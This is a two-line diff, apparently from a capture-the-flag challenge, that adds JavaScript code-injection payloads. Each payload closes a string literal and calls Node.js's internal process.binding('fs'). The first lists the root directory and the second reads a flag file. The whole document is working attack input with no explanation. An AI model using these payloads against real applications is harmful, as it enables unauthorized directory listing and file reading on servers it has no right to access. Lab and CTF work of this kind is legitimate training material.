@@ -1,0 +1,2 @@
+/foo";console.log(process.binding('fs').readdir('\/',0,0));letx="/
+/foo";console.log(process.binding('fs').readFileUtf8('\/flag-c20c72abe616bc0f4733bb3b30c78f1a.txt',0));letx="
